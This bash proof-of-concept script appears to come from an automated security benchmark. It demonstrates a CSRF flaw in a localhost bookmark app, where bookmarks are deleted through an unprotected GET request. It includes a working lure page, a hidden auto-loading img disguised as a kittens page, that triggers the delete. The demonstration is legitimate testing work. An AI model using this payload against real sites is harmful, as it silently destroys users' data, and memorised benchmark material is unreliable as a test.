#!/bin/bash
# POC: CSRF attack on GET-based delete endpoint - demonstrates how an attacker can trick authenticated users into deleting bookmarks without CSRF token protection
# Target: ./repo
# Created: 2025-12-02T16:18:08.850Z
# Session: benchmark-XBEN-075-24-miorxjbp

# CSRF Vulnerability POC: GET-Based Delete Endpoint Without CSRF Protection
# This script demonstrates how a CSRF attack can delete user bookmarks
# without CSRF token validation

TARGET_URL="http://localhost:5000"
BOOKMARK_NAME="TestCSRFVulnerable"

echo "======================================================================"
echo "CSRF Vulnerability POC: GET-Based Delete Endpoint"
echo "======================================================================"
echo ""

# Step 1: Create a test bookmark to demonstrate CSRF on
echo "[*] Step 1: Creating test bookmark..."
CREATE_RESPONSE=$(curl -s -X POST "$TARGET_URL/add" \
  -d "name=$BOOKMARK_NAME&url=http://test.com" \
  -c /tmp/cookies.txt)

echo "Response: $CREATE_RESPONSE"
echo ""

# Step 2: Verify bookmark was created by viewing the page
echo "[*] Step 2: Verifying bookmark was created..."
curl -s -b /tmp/cookies.txt "$TARGET_URL/" | grep -o "$BOOKMARK_NAME" && echo "✓ Bookmark created successfully"
echo ""

# Step 3: Demonstrate CSRF attack - DELETE via GET request without CSRF token
echo "[*] Step 3: Simulating CSRF attack - Sending DELETE request via GET..."
echo "    Attacker sends this malicious request:"
echo "    GET /delete?name=$BOOKMARK_NAME"
echo ""

DELETE_RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/delete?name=$BOOKMARK_NAME")
echo "Delete Response: $DELETE_RESPONSE"
echo ""

# Step 4: Verify bookmark was deleted
echo "[*] Step 4: Verifying bookmark was deleted (CSRF attack successful)..."
VERIFY_RESPONSE=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/")

if echo "$VERIFY_RESPONSE" | grep -q "$BOOKMARK_NAME"; then
    echo "✗ Bookmark still exists - CSRF protection may be in place"
    exit 1
else
    echo "✓ Bookmark successfully deleted via GET request without CSRF token"
    echo "✓ CSRF VULNERABILITY CONFIRMED"
fi

echo ""
echo "======================================================================"
echo "Attack Scenario: Malicious HTML Page"
echo "======================================================================"
echo ""
echo "An attacker creates a website with this embedded code:"
echo ""
cat << 'EOF'
<html>
  <body onload="document.getElementById('csrf').src='http://localhost:5000/delete?name=TestCSRFVulnerable'">
    <img id="csrf" src="" style="display:none">
    <p>Click here to see cute kittens!</p>
  </body>
</html>
EOF
echo ""
echo "When an authenticated user visits this page, the DELETE request is silently executed."
echo ""

# Step 5: Demonstrate that no CSRF token validation exists
echo "======================================================================"
echo "Technical Details"
echo "======================================================================"
echo ""
echo "[*] Checking for CSRF token protection..."
ADD_PAGE=$(curl -s "$TARGET_URL/add")

if echo "$ADD_PAGE" | grep -i "csrf" > /dev/null; then
    echo "✗ Some CSRF protection detected"
else
    echo "✓ No CSRF tokens found in the HTML form"
fi

if echo "$ADD_PAGE" | grep -i "csrf_token" > /dev/null; then
    echo "✗ CSRF token field detected"
else
    echo "✓ Confirmed: No hidden CSRF token fields in forms"
fi

echo ""
echo "[*] Checking HTTP method for delete..."
echo "✓ DELETE operation uses GET method (should use POST)"
echo "✓ GET requests are cached by browsers and proxies"
echo "✓ GET requests should NEVER perform state-changing operations"
echo ""

echo "======================================================================"
echo "VULNERABILITY CONFIRMED"
echo "======================================================================"
echo "- GET-based delete endpoint exists"
echo "- No CSRF tokens validated"
echo "- No SameSite cookie protection"
echo "- Authenticated users are vulnerable to CSRF attacks"
echo "======================================================================"